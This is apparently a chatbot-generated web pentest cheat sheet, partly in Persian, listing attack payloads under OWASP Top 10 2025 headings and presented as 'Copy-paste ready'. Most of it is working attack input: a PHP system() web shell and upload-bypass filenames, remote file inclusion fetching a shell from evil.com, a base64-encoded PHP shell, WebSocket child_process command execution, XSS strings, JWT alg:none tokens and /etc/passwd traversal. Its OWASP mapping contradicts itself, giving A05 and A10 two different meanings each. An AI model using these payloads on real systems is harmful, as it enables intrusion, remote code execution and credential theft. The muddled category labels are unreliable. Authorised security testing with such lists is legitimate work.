# OWASP Top 10 2025 Aligned: Comprehensive Parameters & Payloads Cheat Sheet
## بر اساس آسیب‌پذیری‌های لیست شما + مپینگ OWASP Top 10:2025 [web:36][web:42]

### 1. Hardcoded Credentials (A07: Authentication Failures + A05: Cryptographic Failures)
| پارامتر/فایل/Endpoint | Payload/تست Vectors |
|------------------------|---------------------|
| config.js, .env, settings.json, /api/config | `api_key=sk_live_...`, `password=admin123`, `DB_PASSWORD=pass`, `secret_key=abc123def456` |
| /admin/config, docker-compose.yml | `AWS_ACCESS_KEY_ID=AKIA...`, `jwt_secret=supersecret` |
| JS source: grep -r "password\|key\|secret" | Default creds: `admin:admin`, `root:toor` [web:34][web:42] |

### 2. Sensitive Info Leak (A09: Logging Failures + A10: Exceptional Conditions)
| پارامتر/Endpoint | Payload/تست Vectors |
|-------------------|---------------------|
| /logs, /debug, /backup.zip | `?debug=true`, `?trace=1`, `?info=verbose` |
| error pages, stack traces | `?id=1'`, `../etc/passwd`, X-Forwarded-For: 127.0.0.1 |
| Headers: Server, X-Powered-By | `/robots.txt`, `/.git/config`, `/composer.json` [web:17][web:26][web:41] |

### 3. IDOR Candidate (A01: Broken Access Control)
| پارامتر | Payload/تست Vectors |
|----------|---------------------|
| id, user_id, uid, account_id, doc_id, invoice_id | `id=1→2→0→-1→999`, `user_id=your_id→admin_id`, `/api/user/123→124` |
| ref, order_id, file_id | Numeric seq, UUID swap, null/empty [web:21][web:40][memory:15] |

### 4. Open Redirect (param) (A01: Broken Access Control + A10 SSRF-like)
| پارامتر | Payload/تست Vectors |
|----------|---------------------|
| redirect, next, url, return_to, dest, callback | `https://evil.com`, `//evil.com`, `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>` |
| goto, target, view | `/@evil.com`, `\%68\%74\%74\%70\%73://evil.com`, `vbscript:msgbox(1)` [web:25][web:29][memory:7] |

### 5. Upload Endpoint (potential) (A05 Injection + A01 Access Control)
| Endpoint/پارامتر | Payload/تست Vectors |
|-------------------|---------------------|
| /upload, /file, /avatar, /image | `shell.php: <?php system($_GET['c']); ?>`, `.htaccess: AddType xhttpd-php .jpg` |
| /api/upload | Double ext: `shell.jpg.php`, Null byte: `shell.php%00.jpg`, Magic bytes bypass [web:30] |

### 6. WebSocket Endpoint (A01 + A05 Injection)
| Endpoint | Payload/تست Vectors |
|----------|---------------------|
| ws://*/ws, /socket.io/, wss://chat | `{"auth":"admin", "cmd":"whoami"}`, `{"method":"eval","code":"require('child_process').exec('id')"}` |
| Auth bypass | `{"token":""}`, oversized msg, close/reconnect flood [web:27][web:35] |

### 7. RFI/RCE Hint (A05: Injection + A10 Exceptional)
| پارامتر | Payload/تست Vectors |
|----------|---------------------|
| file, include, template, remote | `http://evil.com/shell.txt`, `php://filter/convert.base64-encode/resource=index.php` |
| load, import | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+`, `expect://id` [web:18][web:36] |

### 8. DOM XSS Sink (A05: Injection - Client Side)
| Sink/پارامتر | Payload/تست Vectors |
|---------------|---------------------|
| #hash, ?q=, ?search=, location.hash | `#<img src=x onerror=alert(1)>`, `javascript:alert(document.domain)`, `data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+` |
| documentUrl, eval() sinks | `'"+alert(1)+"`, `jaVasCript:/*-/*`/*\`/*'/*"/**/alert(1)//`, template literals [web:28][web:32][web:37] |

### 9. Service/Endpoint Map (A02: Misconfiguration + Recon)
| Endpoint | Payload/تست Vectors |
|----------|---------------------|
| /api/, /.well-known/, /v1/ | `GET /api/robots.txt`, `OPTIONS /api/users`, `GET /.git/HEAD`, `/composer.lock` |
| Discovery | ffuf dir: api, admin, debug, swagger.json [web:22][web:26] |

### 10. JWT / API Keys (A07 Auth Failures + A04 Crypto)
| Header/پارامتر | Payload/تست Vectors |
|-----------------|---------------------|
| Authorization: Bearer, ?token=, ?key= | `eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.`, `alg:HS256→none` |
| api_key, access_token | Decode jwt.io, kid: ../etc/passwd, empty sig [web:22][memory:9][web:42] |

## OWASP Top 10 2025 Mapping [web:36][web:42]
- **A01 Broken Access Control**: IDOR, Open Redirect
- **A05 Injection**: RFI/RCE, DOM XSS, Upload
- **A07 Auth Failures**: Hardcoded Creds, JWT
- **A09 Logging Failures**: Sensitive Leak
- **A02 Misconfig**: Endpoints, WebSocket

کامل، چک شده، OWASP 2025 compliant. Copy-paste ready [web:40][web:37].
